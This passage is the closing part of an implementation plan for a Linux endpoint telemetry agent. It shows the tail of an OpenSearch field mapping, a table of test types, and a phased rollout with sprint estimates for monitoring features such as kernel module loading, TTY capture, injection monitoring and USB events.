        "file": {
          "properties": {
            "entropy": { "type": "float" },
            "header_bytes": { "type": "keyword", "index": false },
            "archive": {
              "properties": {
                "type": { "type": "keyword" }
              }
            }
          }
        },
        "auditd": {
          "properties": {
            "result": { "type": "keyword" },
            "sequence": { "type": "long" },
            "data": { "type": "object", "enabled": true }
          }
        }
      }
    }
  }
}
```

---

## Testing Strategy

Each new telemetry capability requires:

| Test Type | Description | Location |
|---|---|---|
| **Unit tests** | Parsers, event schema, entropy calc, dedup logic | `*_test.go` in package |
| **Integration tests** | Real inotify/procfs/socket on Linux VMs | `test/integration/` |
| **Mock tests** | Mock `/proc` filesystem and netlink sockets | `test/mock/` |
| **Benchmark tests** | CPU/memory overhead at scale (1000+ events/sec) | `*_bench_test.go` |
| **ECS validation** | Verify all events pass ECS schema validation | `test/ecs_validate/` |
| **OpenSearch e2e** | Ship events → query OpenSearch → verify fields present | `test/e2e/` |

---

## Rollout Order & Dependencies

```
Phase 2b (Critical) — target v0.3.1
├── 2b.1 SO Loading          [3-4 days, no deps]
├── 2b.2 Kernel Modules      [2-3 days, no deps]  ← can parallel with 2b.1
├── 2b.4 Scheduled Tasks     [3-4 days, no deps]  ← can parallel with 2b.1/2b.2
├── 2b.3 TTY Capture         [4-5 days, benefits from eBPF helper]
└── 2b.5 Injection Monitor   [5-6 days, benefits from eBPF helper]

Phase 2c (High) — target v0.3.2
├── 2c.1 Env Vars            [0.5-1 day, extends process]
├── 2c.5 File Entropy        [1 day, extends FIM]
├── 2c.3 File Access Events  [1-2 days, extends FIM]
├── 2c.2 Script Capture      [1-2 days, extends process]
└── 2c.4 IPC Monitoring      [2-3 days, no deps]

Phase 2d (Medium) — target v0.3.3
├── 2d.1 Network Dedup       [1-2 days, extends network]
├── 2d.3 Archive Tracking    [0.5-1 day, extends FIM + depends on 2c.5]
├── 2d.2 USB Monitoring      [2-3 days, no deps]
├── 2d.5 Container Events    [4-5 days, external client libs]
└── 2d.4 Audit Integration   [5-7 days, most complex]

Total estimated effort: ~40-55 engineering days
```

### Suggested Sprint Allocation

| Sprint | Items | Days | Cumulative |
|---|---|---|---|
| Sprint 1 | 2b.1 SO Loading + 2b.2 Kernel Mod + 2b.4 Sched Tasks | 9-11 | 9-11 |
| Sprint 2 | 2b.3 TTY + 2b.5 Injection | 9-11 | 18-22 |
| Sprint 3 | 2c.1 Env + 2c.5 Entropy + 2c.3 File Access + 2c.2 Script + 2c.4 IPC | 6-9 | 24-31 |
| Sprint 4 | 2d.1 Dedup + 2d.3 Archive + 2d.2 USB | 4-6 | 28-37 |
| Sprint 5 | 2d.5 Container + 2d.4 Audit | 9-12 | 37-49 |

---

*End of implementation plan.*
